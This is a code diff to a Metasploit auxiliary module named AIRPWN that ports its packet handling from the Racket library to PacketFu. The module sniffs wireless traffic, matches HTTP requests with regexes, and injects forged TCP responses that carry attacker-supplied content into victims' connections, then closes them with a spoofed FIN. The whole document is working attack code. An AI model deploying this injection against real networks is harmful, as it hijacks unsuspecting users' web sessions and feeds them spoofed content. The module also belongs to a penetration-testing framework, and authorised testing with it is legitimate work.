@@ -11,10 +11,10 @@
 
 require 'msf/core'
 require 'yaml'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
+	include Msf::Exploit::Capture
 	include Msf::Exploit::Lorcon2
 	include Msf::Auxiliary::Report
 
@@ -140,57 +140,38 @@ class Metasploit3 < Msf::Auxiliary
 			d3 = pkt.dot3
 
 			next if not d3
-
-			eth = Racket::L2::Ethernet.new(d3)
-			next if eth.ethertype != 0x0800
-
-			ip = Racket::L3::IPv4.new(eth.payload)
-			next if ip.protocol != 6
-
-			tcp = Racket::L4::TCP.new(ip.payload)
+			p = PacketFu::Packet.parse(d3) rescue nil
+			next unless p.is_tcp?
 
 			@http.each do |r|
 				hit = nil
 				r['regex'].each do |reg|
-					hit = tcp.payload.scan(/#{reg}/) || nil
+					hit = p.payload.scan(/#{reg}/) || nil
 					break if hit.size != 0
 				end
 				next if hit.size.zero?
 
-				print_status("AIRPWN: %s -> %s HTTP GET [%s] TCP SEQ %u" % [ip.src_ip, ip.dst_ip, $1, tcp.seq])
+				print_status("AIRPWN: %s -> %s HTTP GET [%s] TCP SEQ %u" % [p.ip_saddr, p.ip_daddr, $1, p.tcp_seq])
 
 				injpkt = Lorcon::Packet.new()
 				injpkt.bssid = pkt.bssid
 
-				response = Racket::Racket.new
-				response.l2 = Racket::L2::Ethernet.new("01234567890123")
-				response.l2.dst_mac = eth.src_mac
-				response.l2.src_mac = eth.dst_mac
-				response.l2.ethertype = 0x0800
-
-				response.l3 = Racket::L3::IPv4.new
-				response.l3.src_ip = ip.dst_ip
-				response.l3.dst_ip = ip.src_ip
-				response.l3.protocol = ip.protocol
-				response.l3.ttl = ip.ttl
-
-				response.l4 = Racket::L4::TCP.new
-				response.l4.src_port = tcp.dst_port
-				response.l4.dst_port = tcp.src_port
-				response.l4.window = tcp.window
-
-				response.l4.seq = tcp.ack
-				response.l4.ack = tcp.seq + ip.payload.size - (tcp.offset * 4)
-
-				response.l4.flag_ack = 1
-				response.l4.flag_psh = 1
-
-				response.l5 = Racket::L5::RawL5.new
-				response.l5.payload = r["txresponse"]
-
-				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip, '')
-
-				injpkt.dot3 = response.pack
+				response_pkt = PacketFu::TCPPacket.new
+				response_pkt.eth_daddr = p.eth_saddr
+				response_pkt.eth_saddr = p.eth_daddr
+				response_pkt.ip_saddr = p.ip_daddr
+				response_pkt.ip_daddr = p.ip_saddr
+				response_pkt.ip_ttl = p.ip_ttl
+				response_pkt.tcp_sport = p.tcp_dport
+				response_pkt.tcp_dport = p.tcp_sport
+				response_pkt.tcp_win = p.tcp_win
+				response_pkt.tcp_seq = p.tcp_ack
+				response_pkt.tcp_ack = (p.tcp_seq + p.ip_header.body.to_s.size - (p.tcp_hlen * 4)) & 0xffffffff
+				response_pkt.tcp_flags.ack = 1
+				response_pkt.tcp_flags.psh = 1
+				response_pkt.payload = r["txresponse"]
+				response_pkt.recalc
+				injpkt.dot3 = response_pkt.to_s
 
 				case pkt.direction
 				when ::Lorcon::Packet::LORCON_FROM_DS
@@ -203,14 +184,14 @@ class Metasploit3 < Msf::Auxiliary
 
 				self.wifi.inject(injpkt) or print_error("AIRPWN failed to inject packet: " + tx.error)
 
-				response.l4.seq = response.l4.seq + response.l5.payload.size
-				response.l4.flag_ack = 1
-				response.l4.flag_psh = 0
-				response.l4.flag_fin = 1
-				response.l4.payload = ""
-				response.l4.fix!(response.l3.src_ip, response.l3.dst_ip, "")
+				response_pkt.tcp_seq = response_pkt.tcp_seq + response_pkt.payload.size
+				response_pkt.tcp_flags.ack = 1
+				response_pkt.tcp_flags.psh = 0
+				response_pkt.tcp_flags.fin = 1
+				response_pkt.payload = 0
+				response_pkt.recalc
 
-				injpkt.dot3 = response.pack
+				injpkt.dot3 = response_pkt.to_s
 				self.wifi.inject(injpkt) or print_error("AIRPWN failed to inject packet: " + tx.error)
 			end
 		end
